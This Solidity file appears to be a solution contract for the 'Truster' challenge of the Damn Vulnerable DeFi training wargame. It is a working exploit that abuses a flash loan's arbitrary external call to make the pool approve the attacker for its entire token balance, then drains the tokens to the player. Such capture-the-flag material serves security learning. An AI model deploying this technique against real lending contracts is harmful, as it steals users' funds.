// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Address} from "@openzeppelin/contracts/utils/Address.sol";
import {DamnValuableToken} from "./DamnValuableToken.sol";
import {TrusterLenderPool} from "./TrusterLenderPool.sol";

contract TrusterLenderPoolAttacker {
    using Address for address;

    address public player;

    constructor(address _player) {
        player = _player;
    }

    function attack(TrusterLenderPool pool) public {
        DamnValuableToken token = pool.token();
        pool.flashLoan(
            0,
            address(this),
            address(token),
            abi.encodeCall(token.approve, (address(this), token.balanceOf(address(pool))))
        );
        token.transferFrom(address(pool), player, token.balanceOf(address(pool)));
    }
}
